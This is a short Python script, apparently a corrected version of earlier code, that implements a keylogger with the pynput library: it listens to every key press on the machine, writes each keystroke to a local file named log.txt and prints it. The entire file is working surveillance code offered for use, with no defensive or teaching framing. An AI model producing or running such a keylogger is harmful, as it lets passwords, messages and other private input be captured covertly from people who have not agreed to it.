import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):  # Fixed constructor name
        self.logger = ""

    def append_to_log(self, key_strike):
        # Directly append the key strike to the log file
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(key_strike)
        print(key_strike)  # Print the pressed key, not the entire logger
        # We don't need to reset self.logger after every key press.

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)  # Correct variable naming convention
        except AttributeError:
            if key == pynput.keyboard.Key.space:  # Fixed space key comparison
                pressed_key = " "  # Handle space key correctly
            else:
                pressed_key = " " + str(key) + " "  # Handle other special keys
        self.append_to_log(pressed_key)  # Log the pressed key

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()  # Start the listener indefinitely

if __name__ == "__main__":
    SimpleKeyLogger().start()  # Start keylogger when this script is executed